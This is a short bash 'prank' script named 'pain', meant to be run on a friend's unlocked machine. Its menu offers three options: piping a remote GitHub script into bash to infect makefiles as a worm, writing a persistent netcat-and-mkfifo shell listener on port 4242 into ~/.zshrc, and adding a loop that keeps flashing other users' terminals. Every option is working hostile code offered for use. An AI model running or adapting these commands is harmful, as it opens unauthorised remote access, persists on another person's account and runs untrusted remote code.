
#!/bin/bash

usage() {
cat <<EOF
pain 0.2

The painful script for your friend who forgot to lock his screen

Options:
  1 - makefile worm
  2 - reverseshell 
  3 - party in terminals
EOF
}

party() {
    command='o=("h" "l");O=0;while true; do for t in $(w|awk '\'\\\'\''$2~/^s/{print $2}'\'\\\'\'');do printf "\e[?5${o[O]}">/dev/tty$t;done;O=$(((O+1)%2));sleep 1;done & disown'
    echo "echo '$command' | bash" >> ~/.zshrc
    echo "echo '$command' | bash" | bash
}

infect_make() {
    curl https://raw.githubusercontent.com/Bluegales/pain/main/infect.sh | bash
}

reverseshell() {
    command="while (true) {rm -f /tmp/f;mkfifo /tmp/f;nc -l 4242 0</tmp/f | zsh 1>/tmp/f 2>&1} & disown"
    echo $command >> ~/.zshrc
    echo $command | zsh
}

usage

read choice
case $choice in
    1)
        infect_make
        ;;
    2)
        reverseshell
        ;;
    3)
        party
        ;;
    4)
        echo "done :)"
        ;;
    5)
        echo "done :)"
        ;;
esac
